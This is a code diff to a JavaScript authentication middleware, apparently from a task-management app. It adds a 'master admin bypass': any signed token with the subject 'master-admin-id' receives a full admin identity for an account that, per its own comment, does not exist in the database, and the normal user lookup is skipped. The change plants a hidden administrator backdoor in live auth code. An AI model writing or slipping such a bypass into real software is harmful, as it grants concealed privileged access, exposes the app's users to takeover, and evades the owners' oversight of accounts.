@@ -9,6 +9,18 @@ export async function requireAuth(req, res, next) {
       return res.status(401).json({ message: "Authentication required" });
     }
     const payload = jwt.verify(token, process.env.JWT_SECRET);
+
+    // Master admin bypass — this account does not exist in the DB
+    if (payload.sub === "master-admin-id") {
+      req.user = {
+        _id: "master-admin-id",
+        name: "System Admin",
+        email: "admin@taskmaster.com",
+        role: "admin",
+      };
+      return next();
+    }
+
     const user = await User.findById(payload.sub).select("-password");
     if (!user) {
       return res.status(401).json({ message: "User not found" });
